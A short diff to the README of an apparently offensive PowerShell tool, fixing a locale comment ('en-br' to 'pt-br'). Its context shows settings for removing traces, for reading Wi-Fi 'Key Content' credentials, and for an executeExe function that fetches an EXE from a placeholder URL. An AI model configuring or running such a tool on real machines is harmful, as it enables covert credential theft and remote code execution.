@@ -28,7 +28,7 @@ $removeTraces = $true  <# Remove traces #>
 You can also change some extra variables according to your preferences regarding the modules:
 
 ```powershell
-$keyContentLabel = "Key Content"  <# Only if the system is not in en-us or en-br. #>
+$keyContentLabel = "Key Content"  <# Only if the system is not in en-us or pt-br. #>
 $exeUrl = "https://somerandomwebsite.lol/yourfile.exe" <# The EXE file referring to the executeExe function. #>
 ```
 
